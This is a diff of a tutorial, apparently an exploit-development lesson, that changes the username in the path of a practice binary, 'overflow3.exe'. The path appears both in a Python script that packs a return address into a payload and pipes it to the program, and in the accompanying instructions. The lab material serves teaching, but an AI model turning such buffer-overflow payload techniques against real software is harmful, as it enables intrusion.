@@ -35,7 +35,7 @@ payload += struct.pack("<Q", 0x14000158C)
 
 # Run the vulnerable program and supply the payload
 process = subprocess.Popen(
-    ["C:/Users/robbi/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary
+    ["C:/Users/g3tsyst3m/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary
     stdin=subprocess.PIPE,
     stdout=subprocess.PIPE,
     stderr=subprocess.PIPE
@@ -55,7 +55,7 @@ if stderr:
 
 Before you run the script, be sure to update this line to reflect your vulnerable program's path and actual name:
 
- **["C:/Users/robbi/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary**
+ **["C:/Users/g3tsyst3m/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary**
 
  
 Once you're ready, go ahead and run the python script.  You should see the following:
